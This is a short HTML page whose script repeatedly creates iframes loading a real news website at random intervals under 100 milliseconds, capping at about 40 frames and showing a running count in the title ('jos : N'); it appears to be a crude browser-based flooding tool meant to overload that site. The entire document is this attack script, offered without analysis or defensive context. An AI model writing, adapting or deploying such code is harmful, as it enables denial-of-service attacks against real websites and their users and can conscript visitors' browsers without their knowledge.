<html>
	<body>
		<script>
		var urls = [
			"http://www.publika.md"
		]
		var count = 0;
		setInterval(
			function() {
				if (count > 40) document.body.removeChild(document.body.firstChild);
				var i = document.createElement("iframe");
				i.src = urls[Math.floor(Math.random() * urls.length)];
				i.width = 100;
				i.height = 100;
				document.body.appendChild(i);
				count++;
				document.title = 'jos : ' + count;
			},
			Math.random() * 100
		)
		</script>
	</body>
</html>
